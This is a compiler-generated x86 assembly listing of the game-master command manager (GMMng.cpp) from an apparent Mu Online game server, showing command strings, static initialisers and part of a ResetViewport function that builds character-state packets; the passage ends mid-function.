;	COMDAT ??_C@_0L@KDDCLIK@?1userwatch@
CONST	SEGMENT
??_C@_0L@KDDCLIK@?1userwatch@ DB '/userwatch', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_06JJEGOPHB@?1trace@
CONST	SEGMENT
??_C@_06JJEGOPHB@?1trace@ DB '/trace', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_09PNMFKAIE@?1userstat@
CONST	SEGMENT
??_C@_09PNMFKAIE@?1userstat@ DB '/userstat', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_05GPHHBAG@?1make@
CONST	SEGMENT
??_C@_05GPHHBAG@?1make@ DB '/make', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_06EIGIJLP@?1gmove@
CONST	SEGMENT
??_C@_06EIGIJLP@?1gmove@ DB '/gmove', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_02ODPMDCNK@?1m@
CONST	SEGMENT
??_C@_02ODPMDCNK@?1m@ DB '/m', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_05PCNGDGBG@?1move@
CONST	SEGMENT
??_C@_05PCNGDGBG@?1move@ DB '/move', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_07DKLNGAJK@?1soccer@
CONST	SEGMENT
??_C@_07DKLNGAJK@?1soccer@ DB '/soccer', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_04NILIJCHB@?1war@
CONST	SEGMENT
??_C@_04NILIJCHB@?1war@ DB '/war', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@EEPBOOJK@?1summonchar@
CONST	SEGMENT
??_C@_0M@EEPBOOJK@?1summonchar@ DB '/summonchar', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@GPOPOLAO@?1clearinven@
CONST	SEGMENT
??_C@_0M@GPOPOLAO@?1clearinven@ DB '/clearinven', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@BMILIDFD@?1clearitem@
CONST	SEGMENT
??_C@_0L@BMILIDFD@?1clearitem@ DB '/clearitem', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0O@OHPCDLEP@?1clearmonster@
CONST	SEGMENT
??_C@_0O@OHPCDLEP@?1clearmonster@ DB '/clearmonster', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0P@FBJALDCH@?1summonmonster@
CONST	SEGMENT
??_C@_0P@FBJALDCH@?1summonmonster@ DB '/summonmonster', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_06JICFFAOM@?1party@
CONST	SEGMENT
??_C@_06JICFFAOM@?1party@ DB '/party', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_08NMMECFKO@?1ability@
CONST	SEGMENT
??_C@_08NMMECFKO@?1ability@ DB '/ability', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@MGPFMLOL@?1?D?$LD?$LI?$KP?E?M?$LM?R?H?$KP@
CONST	SEGMENT
??_C@_0M@MGPFMLOL@?1?D?$LD?$LI?$KP?E?M?$LM?R?H?$KP@ DB '/', 0c4H, 0b3H, 0b8H
	DB	0afH, 0c5H, 0cdH, 0bcH, 0d2H, 0c8H, 0afH, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_09HHLKFDID@?1?$MA?N?$LK?$KF?A?$KG?$LA?E@
CONST	SEGMENT
??_C@_09HHLKFDID@?1?$MA?N?$LK?$KF?A?$KG?$LA?E@ DB '/', 0c0H, 0ceH, 0baH, 0a5H
	DB	0c1H, 0a6H, 0b0H, 0c5H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@CKGHABCD@?1?$LO?F?$MA?L?E?$NL?A?$KG?$LA?E@
CONST	SEGMENT
??_C@_0M@CKGHABCD@?1?$LO?F?$MA?L?E?$NL?A?$KG?$LA?E@ DB '/', 0beH, 0c6H, 0c0H
	DB	0ccH, 0c5H, 0dbH, 0c1H, 0a6H, 0b0H, 0c5H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@PCFENPAP@?1?$LI?s?$LN?$LK?E?M?A?$KG?$LA?E@
CONST	SEGMENT
??_C@_0M@PCFENPAP@?1?$LI?s?$LN?$LK?E?M?A?$KG?$LA?E@ DB '/', 0b8H, 0f3H, 0bdH
	DB	0baH, 0c5H, 0cdH, 0c1H, 0a6H, 0b0H, 0c5H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@NCLLHGHP@?1?$LI?s?$LN?$LK?E?M?$LM?R?H?$KP@
CONST	SEGMENT
??_C@_0M@NCLLHGHP@?1?$LI?s?$LN?$LK?E?M?$LM?R?H?$KP@ DB '/', 0b8H, 0f3H, 0bdH
	DB	0baH, 0c5H, 0cdH, 0bcH, 0d2H, 0c8H, 0afH, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_05PKOPIGND@?1?F?D?F?$LM@
CONST	SEGMENT
??_C@_05PKOPIGND@?1?F?D?F?$LM@ DB '/', 0c6H, 0c4H, 0c6H, 0bcH, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_05GPBILLLO@?1?$LE?I?$LH?B@
CONST	SEGMENT
??_C@_05GPBILLLO@?1?$LE?I?$LH?B@ DB '/', 0b4H, 0c9H, 0b7H, 0c2H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_08LPJLINAO@?1warstop@
CONST	SEGMENT
??_C@_08LPJLINAO@?1warstop@ DB '/warstop', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_09EPAPKJCF@?1warstart@
CONST	SEGMENT
??_C@_09EPAPKJCF@?1warstart@ DB '/warstart', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_07JMNOJOCB@?1warend@
CONST	SEGMENT
??_C@_07JMNOJOCB@?1warend@ DB '/warend', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@IMEJJNPL@?1guilddisconnect@
CONST	SEGMENT
??_C@_0BB@IMEJJNPL@?1guilddisconnect@ DB '/guilddisconnect', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@FCNFKDHF@?1guildmove@
CONST	SEGMENT
??_C@_0L@FCNFKDHF@?1guildmove@ DB '/guildmove', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@EDCFKOKG@?1whisperon@
CONST	SEGMENT
??_C@_0L@EDCFKOKG@?1whisperon@ DB '/whisperon', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@CECLOOK@?1whisperoff@
CONST	SEGMENT
??_C@_0M@CECLOOK@?1whisperoff@ DB '/whisperoff', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0M@NAACLKOB@?1disconnect@
CONST	SEGMENT
??_C@_0M@NAACLKOB@?1disconnect@ DB '/disconnect', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BE@JELMHMFI@KUNDUN_EVENT_GM_LOG@
CONST	SEGMENT
??_C@_0BE@JELMHMFI@KUNDUN_EVENT_GM_LOG@ DB 'KUNDUN_EVENT_GM_LOG', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@PIGDOKKG@?4?2KUNDUN_EVENT_GM_LOG@
CONST	SEGMENT
??_C@_0BG@PIGDOKKG@?4?2KUNDUN_EVENT_GM_LOG@ DB '.\KUNDUN_EVENT_GM_LOG', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7CGMMng@@6B@
CONST	SEGMENT
??_7CGMMng@@6B@ DD FLAT:??_R4CGMMng@@6B@		; CGMMng::`vftable'
	DD	FLAT:??_ECGMMng@@UAEPAXI@Z
CONST	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z$0
__ehfuncinfo$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?ManagementProc@CGMMng@@QAEHPAVOBJECTSTRUCT@@PADH@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z$0
__ehfuncinfo$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$CStringT@DV?$StrTraitMFC@DV?$ChTraitsCRT@D@ATL@@@@@ATL@@QAE@PBD@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
CRT$XCU	SEGMENT
?cManager$initializer$@@3P6AXXZA DD FLAT:??__EcManager@@YAXXZ ; cManager$initializer$
CRT$XCU	ENDS
; Function compile flags: /Odtp /ZI
;	COMDAT ??__FcManager@@YAXXZ
text$yd	SEGMENT
??__FcManager@@YAXXZ PROC				; `dynamic atexit destructor for 'cManager'', COMDAT
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	b9 00 00 00 00	 mov	 ecx, OFFSET ?cManager@@3VCGMMng@@A ; cManager
  0000e	e8 00 00 00 00	 call	 ??1CGMMng@@UAE@XZ	; CGMMng::~CGMMng
  00013	5f		 pop	 edi
  00014	5e		 pop	 esi
  00015	5b		 pop	 ebx
  00016	8b e5		 mov	 esp, ebp
  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
??__FcManager@@YAXXZ ENDP				; `dynamic atexit destructor for 'cManager''
text$yd	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ??__EcManager@@YAXXZ
text$di	SEGMENT
??__EcManager@@YAXXZ PROC				; `dynamic initializer for 'cManager'', COMDAT

; 165  : CGMMng	cManager;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	b9 00 00 00 00	 mov	 ecx, OFFSET ?cManager@@3VCGMMng@@A ; cManager
  0000e	e8 00 00 00 00	 call	 ??0CGMMng@@QAE@XZ	; CGMMng::CGMMng
  00013	68 00 00 00 00	 push	 OFFSET ??__FcManager@@YAXXZ ; `dynamic atexit destructor for 'cManager''
  00018	e8 00 00 00 00	 call	 _atexit
  0001d	83 c4 04	 add	 esp, 4
  00020	5f		 pop	 edi
  00021	5e		 pop	 esi
  00022	5b		 pop	 ebx
  00023	8b e5		 mov	 esp, ebp
  00025	5d		 pop	 ebp
  00026	c3		 ret	 0
??__EcManager@@YAXXZ ENDP				; `dynamic initializer for 'cManager''
text$di	ENDS
; Function compile flags: /Odtp /ZI
;	COMDAT ??__FKUNDUN_GM_LOG@@YAXXZ
text$yd	SEGMENT
??__FKUNDUN_GM_LOG@@YAXXZ PROC				; `dynamic atexit destructor for 'KUNDUN_GM_LOG'', COMDAT
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	b9 00 00 00 00	 mov	 ecx, OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  0000e	e8 00 00 00 00	 call	 ??1CLogToFile@@QAE@XZ	; CLogToFile::~CLogToFile
  00013	5f		 pop	 edi
  00014	5e		 pop	 esi
  00015	5b		 pop	 ebx
  00016	8b e5		 mov	 esp, ebp
  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
??__FKUNDUN_GM_LOG@@YAXXZ ENDP				; `dynamic atexit destructor for 'KUNDUN_GM_LOG''
text$yd	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ??__EKUNDUN_GM_LOG@@YAXXZ
text$di	SEGMENT
??__EKUNDUN_GM_LOG@@YAXXZ PROC				; `dynamic initializer for 'KUNDUN_GM_LOG'', COMDAT

; 60   : CLogToFile	KUNDUN_GM_LOG ("KUNDUN_EVENT_GM_LOG", ".\\KUNDUN_EVENT_GM_LOG");		//  

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	6a 01		 push	 1
  0000b	68 00 00 00 00	 push	 OFFSET ??_C@_0BG@PIGDOKKG@?4?2KUNDUN_EVENT_GM_LOG@
  00010	68 00 00 00 00	 push	 OFFSET ??_C@_0BE@JELMHMFI@KUNDUN_EVENT_GM_LOG@
  00015	b9 00 00 00 00	 mov	 ecx, OFFSET ?KUNDUN_GM_LOG@@3VCLogToFile@@A ; KUNDUN_GM_LOG
  0001a	e8 00 00 00 00	 call	 ??0CLogToFile@@QAE@QAD0H@Z ; CLogToFile::CLogToFile
  0001f	68 00 00 00 00	 push	 OFFSET ??__FKUNDUN_GM_LOG@@YAXXZ ; `dynamic atexit destructor for 'KUNDUN_GM_LOG''
  00024	e8 00 00 00 00	 call	 _atexit
  00029	83 c4 04	 add	 esp, 4
  0002c	5f		 pop	 edi
  0002d	5e		 pop	 esi
  0002e	5b		 pop	 ebx
  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c3		 ret	 0
??__EKUNDUN_GM_LOG@@YAXXZ ENDP				; `dynamic initializer for 'KUNDUN_GM_LOG''
text$di	ENDS
; Function compile flags: /Odtp /ZI
;	COMDAT ??_GCGMMng@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_GCGMMng@@UAEPAXI@Z PROC				; CGMMng::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ??1CGMMng@@UAE@XZ	; CGMMng::~CGMMng
  00014	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00017	83 e0 01	 and	 eax, 1
  0001a	74 11		 je	 SHORT $LN2@scalar
  0001c	68 90 31 00 00	 push	 12688			; 00003190H
  00021	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00024	50		 push	 eax
  00025	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  0002a	83 c4 08	 add	 esp, 8
$LN2@scalar:
  0002d	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00030	5f		 pop	 edi
  00031	5e		 pop	 esi
  00032	5b		 pop	 ebx
  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c2 04 00	 ret	 4
??_GCGMMng@@UAEPAXI@Z ENDP				; CGMMng::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ?ResetViewport@CGMMng@@QAEXPAVOBJECTSTRUCT@@@Z
_TEXT	SEGMENT
_n$1 = -5096						; size = 4
_lpTempObj$2 = -5092					; size = 4
_n$3 = -5088						; size = 4
_lpTempObj$4 = -5084					; size = 4
_i$5 = -5080						; size = 4
_MaxAddPoint$ = -5076					; size = 2
_AddPoint$ = -5072					; size = 2
_pjMsg$ = -5068						; size = 52
_pCount$ = -5016					; size = 4
_ViewportDestroy$ = -5012				; size = 2
_sendBuf$ = -5008					; size = 5000
_this$ = -8						; size = 4
__$ArrayPad$ = -4					; size = 4
_lpObj$ = 8						; size = 4
?ResetViewport@CGMMng@@QAEXPAVOBJECTSTRUCT@@@Z PROC	; CGMMng::ResetViewport, COMDAT
; _this$ = ecx

; 4895 : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	b8 e8 15 00 00	 mov	 eax, 5608		; 000015e8H
  00008	e8 00 00 00 00	 call	 __chkstk
  0000d	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  00012	33 c5		 xor	 eax, ebp
  00014	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00017	53		 push	 ebx
  00018	56		 push	 esi
  00019	57		 push	 edi
  0001a	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 4896 : 	BYTE sendBuf[5000];
; 4897 : 
; 4898 : 	PMSG_VIEWPORTDESTROY ViewportDestroy;
; 4899 : 	PBMSG_COUNT pCount;
; 4900 : 
; 4901 : 	ViewportDestroy.NumberH = HIBYTE(lpObj->m_Index);

  0001d	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00020	8b 08		 mov	 ecx, DWORD PTR [eax]
  00022	c1 e9 08	 shr	 ecx, 8
  00025	81 e1 ff 00 00
	00		 and	 ecx, 255		; 000000ffH
  0002b	88 8d 6c ec ff
	ff		 mov	 BYTE PTR _ViewportDestroy$[ebp], cl

; 4902 : 	ViewportDestroy.NumberL = LOBYTE(lpObj->m_Index);

  00031	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00034	8b 08		 mov	 ecx, DWORD PTR [eax]
  00036	81 e1 ff 00 00
	00		 and	 ecx, 255		; 000000ffH
  0003c	88 8d 6d ec ff
	ff		 mov	 BYTE PTR _ViewportDestroy$[ebp+1], cl

; 4903 : 
; 4904 : 	memcpy(&sendBuf[sizeof(pCount)],&ViewportDestroy,sizeof(ViewportDestroy));

  00042	6a 02		 push	 2
  00044	8d 85 6c ec ff
	ff		 lea	 eax, DWORD PTR _ViewportDestroy$[ebp]
  0004a	50		 push	 eax
  0004b	b9 01 00 00 00	 mov	 ecx, 1
  00050	c1 e1 02	 shl	 ecx, 2
  00053	8d 94 0d 70 ec
	ff ff		 lea	 edx, DWORD PTR _sendBuf$[ebp+ecx]
  0005a	52		 push	 edx
  0005b	e8 00 00 00 00	 call	 _memcpy
  00060	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4905 : 
; 4906 : 	pCount.h.c			= PMHC_BYTE;

  00063	c6 85 68 ec ff
	ff c1		 mov	 BYTE PTR _pCount$[ebp], 193 ; 000000c1H

; 4907 : 	pCount.h.headcode	= PMHC_VIEWPORTDESTROY;

  0006a	c6 85 6a ec ff
	ff 14		 mov	 BYTE PTR _pCount$[ebp+2], 20 ; 00000014H

; 4908 : 	pCount.h.size		= sizeof(pCount)+sizeof(ViewportDestroy);

  00071	c6 85 69 ec ff
	ff 06		 mov	 BYTE PTR _pCount$[ebp+1], 6

; 4909 : 	pCount.count		= 1;

  00078	c6 85 6b ec ff
	ff 01		 mov	 BYTE PTR _pCount$[ebp+3], 1

; 4910 : 
; 4911 : 	memcpy(sendBuf,&pCount,sizeof(pCount));

  0007f	6a 04		 push	 4
  00081	8d 85 68 ec ff
	ff		 lea	 eax, DWORD PTR _pCount$[ebp]
  00087	50		 push	 eax
  00088	8d 8d 70 ec ff
	ff		 lea	 ecx, DWORD PTR _sendBuf$[ebp]
  0008e	51		 push	 ecx
  0008f	e8 00 00 00 00	 call	 _memcpy
  00094	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4912 : 
; 4913 : 	gObjViewportListProtocolDestroy(lpObj);

  00097	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0009a	50		 push	 eax
  0009b	e8 00 00 00 00	 call	 ?gObjViewportListProtocolDestroy@@YAXPAVOBJECTSTRUCT@@@Z ; gObjViewportListProtocolDestroy
  000a0	83 c4 04	 add	 esp, 4

; 4914 : 
; 4915 : 	::DataSend(lpObj->m_Index, sendBuf, pCount.h.size);

  000a3	0f b6 85 69 ec
	ff ff		 movzx	 eax, BYTE PTR _pCount$[ebp+1]
  000aa	50		 push	 eax
  000ab	8d 8d 70 ec ff
	ff		 lea	 ecx, DWORD PTR _sendBuf$[ebp]
  000b1	51		 push	 ecx
  000b2	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  000b5	8b 02		 mov	 eax, DWORD PTR [edx]
  000b7	50		 push	 eax
  000b8	e8 00 00 00 00	 call	 ?DataSend@@YAHHPAEK@Z	; DataSend
  000bd	83 c4 0c	 add	 esp, 12			; 0000000cH

; 4916 : 
; 4917 : 	PMSG_CHARMAPJOINRESULT pjMsg;
; 4918 : 
; 4919 : 	pjMsg.h.c			= PMHCE_BYTE;

  000c0	c6 85 34 ec ff
	ff c3		 mov	 BYTE PTR _pjMsg$[ebp], 195 ; 000000c3H

; 4920 : 	pjMsg.h.headcode	= 0xF3;

  000c7	c6 85 36 ec ff
	ff f3		 mov	 BYTE PTR _pjMsg$[ebp+2], 243 ; 000000f3H

; 4921 : 	pjMsg.h.size		= sizeof(PMSG_CHARMAPJOINRESULT);

  000ce	c6 85 35 ec ff
	ff 34		 mov	 BYTE PTR _pjMsg$[ebp+1], 52 ; 00000034H

; 4922 : 	pjMsg.subcode		= 0x03;

  000d5	c6 85 37 ec ff
	ff 03		 mov	 BYTE PTR _pjMsg$[ebp+3], 3

; 4923 : 	pjMsg.MapX			= lpObj->X;

  000dc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000df	8a 88 04 01 00
	00		 mov	 cl, BYTE PTR [eax+260]
  000e5	88 8d 38 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+4], cl

; 4924 : 	pjMsg.MapY			= lpObj->Y;

  000eb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000ee	8a 88 06 01 00
	00		 mov	 cl, BYTE PTR [eax+262]
  000f4	88 8d 39 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+5], cl

; 4925 : 	pjMsg.MapNumber		= lpObj->MapNumber;

  000fa	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  000fd	8a 88 09 01 00
	00		 mov	 cl, BYTE PTR [eax+265]
  00103	88 8d 3a ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+6], cl

; 4926 : 	pjMsg.Dir			= lpObj->Dir;

  00109	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0010c	8a 88 08 01 00
	00		 mov	 cl, BYTE PTR [eax+264]
  00112	88 8d 3b ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+7], cl

; 4927 : 
; 4928 : #ifdef	MASTER_LEVEL_UP_SYSTEM_20070912	//   -> EXP  	
; 4929 : 	// *     .    .
; 4930 : 	INT64 i64Exp = lpObj->Experience;
; 4931 : 	if( g_MasterLevelSystem.IsMasterLevelUser( lpObj ) )
; 4932 : 	{
; 4933 : 		i64Exp = lpObj->m_i64MasterLevelExp;
; 4934 : 	}
; 4935 : 
; 4936 : 	//     						
; 4937 : 	pjMsg.btExp1			= HIBYTE(HIWORD(HILONG( i64Exp )));
; 4938 : 	pjMsg.btExp2			= LOBYTE(HIWORD(HILONG( i64Exp )));
; 4939 : 	pjMsg.btExp3			= HIBYTE(LOWORD(HILONG( i64Exp )));
; 4940 : 	pjMsg.btExp4			= LOBYTE(LOWORD(HILONG( i64Exp )));
; 4941 : 	pjMsg.btExp5			= HIBYTE(HIWORD(LOLONG( i64Exp )));
; 4942 : 	pjMsg.btExp6			= LOBYTE(HIWORD(LOLONG( i64Exp )));
; 4943 : 	pjMsg.btExp7			= HIBYTE(LOWORD(LOLONG( i64Exp )));
; 4944 : 	pjMsg.btExp8			= LOBYTE(LOWORD(LOLONG( i64Exp )));	
; 4945 : 
; 4946 : 	INT64 i64NextExp = lpObj->NextExp;
; 4947 : 	if( g_MasterLevelSystem.IsMasterLevelUser( lpObj ) )
; 4948 : 	{
; 4949 : 		i64NextExp = lpObj->m_i64NextMasterLevelExp;
; 4950 : 	}	
; 4951 : 	pjMsg.btNextExp1		= HIBYTE(HIWORD(HILONG( i64NextExp )));
; 4952 : 	pjMsg.btNextExp2		= LOBYTE(HIWORD(HILONG( i64NextExp )));
; 4953 : 	pjMsg.btNextExp3		= HIBYTE(LOWORD(HILONG( i64NextExp )));
; 4954 : 	pjMsg.btNextExp4		= LOBYTE(LOWORD(HILONG( i64NextExp )));
; 4955 : 	pjMsg.btNextExp5		= HIBYTE(HIWORD(LOLONG( i64NextExp )));
; 4956 : 	pjMsg.btNextExp6		= LOBYTE(HIWORD(LOLONG( i64NextExp )));
; 4957 : 	pjMsg.btNextExp7		= HIBYTE(LOWORD(LOLONG( i64NextExp )));
; 4958 : 	pjMsg.btNextExp8		= LOBYTE(LOWORD(LOLONG( i64NextExp )));	
; 4959 : #else
; 4960 : 	pjMsg.Exp			= lpObj->Experience;

  00118	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0011b	8b 88 a8 00 00
	00		 mov	 ecx, DWORD PTR [eax+168]
  00121	89 8d 3c ec ff
	ff		 mov	 DWORD PTR _pjMsg$[ebp+8], ecx

; 4961 : 	pjMsg.NextExp		= lpObj->NextExp;

  00127	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0012a	8b 88 ac 00 00
	00		 mov	 ecx, DWORD PTR [eax+172]
  00130	89 8d 40 ec ff
	ff		 mov	 DWORD PTR _pjMsg$[ebp+12], ecx

; 4962 : #endif
; 4963 : 
; 4964 : 	pjMsg.LevelUpPoint	= lpObj->LevelUpPoint;

  00136	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00139	66 8b 88 a4 00
	00 00		 mov	 cx, WORD PTR [eax+164]
  00140	66 89 8d 44 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+16], cx

; 4965 : 	pjMsg.Str			= lpObj->Strength;

  00147	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0014a	66 8b 88 b4 00
	00 00		 mov	 cx, WORD PTR [eax+180]
  00151	66 89 8d 46 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+18], cx

; 4966 : 	pjMsg.Dex			= lpObj->Dexterity;

  00158	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0015b	66 8b 88 b6 00
	00 00		 mov	 cx, WORD PTR [eax+182]
  00162	66 89 8d 48 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+20], cx

; 4967 : 	pjMsg.Vit			= lpObj->Vitality;

  00169	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0016c	66 8b 88 b8 00
	00 00		 mov	 cx, WORD PTR [eax+184]
  00173	66 89 8d 4a ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+22], cx

; 4968 : 	pjMsg.Energy		= lpObj->Energy;

  0017a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0017d	66 8b 88 ba 00
	00 00		 mov	 cx, WORD PTR [eax+186]
  00184	66 89 8d 4c ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+24], cx

; 4969 : 	pjMsg.Money			= lpObj->Money;

  0018b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0018e	8b 88 b0 00 00
	00		 mov	 ecx, DWORD PTR [eax+176]
  00194	89 8d 5c ec ff
	ff		 mov	 DWORD PTR _pjMsg$[ebp+40], ecx

; 4970 : 	pjMsg.PkLevel		= lpObj->m_PK_Level;

  0019a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0019d	8a 88 fd 00 00
	00		 mov	 cl, BYTE PTR [eax+253]
  001a3	88 8d 60 ec ff
	ff		 mov	 BYTE PTR _pjMsg$[ebp+44], cl

; 4971 : 	pjMsg.Life			= (WORD)(lpObj->Life);

  001a9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001ac	f3 0f 2c 88 bc
	00 00 00	 cvttss2si ecx, DWORD PTR [eax+188]
  001b4	66 89 8d 4e ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+26], cx

; 4972 : 	pjMsg.MaxLife		= (WORD)(lpObj->MaxLife+lpObj->AddLife);

  001bb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001be	f3 0f 2a 80 0c
	01 00 00	 cvtsi2ss xmm0, DWORD PTR [eax+268]
  001c6	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  001c9	f3 0f 58 81 c0
	00 00 00	 addss	 xmm0, DWORD PTR [ecx+192]
  001d1	f3 0f 2c d0	 cvttss2si edx, xmm0
  001d5	66 89 95 50 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+28], dx

; 4973 : 	pjMsg.Mana			= (WORD)(lpObj->Mana);

  001dc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  001df	f3 0f 2c 88 d0
	00 00 00	 cvttss2si ecx, DWORD PTR [eax+208]
  001e7	66 89 8d 52 ec
	ff ff		 mov	 WORD PTR _pjMsg$[ebp+30], cx

; 4974 : 	pjMsg.MaxMana		= (WORD)(lpObj->MaxMana+lpObj->AddMana);

  001ee	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
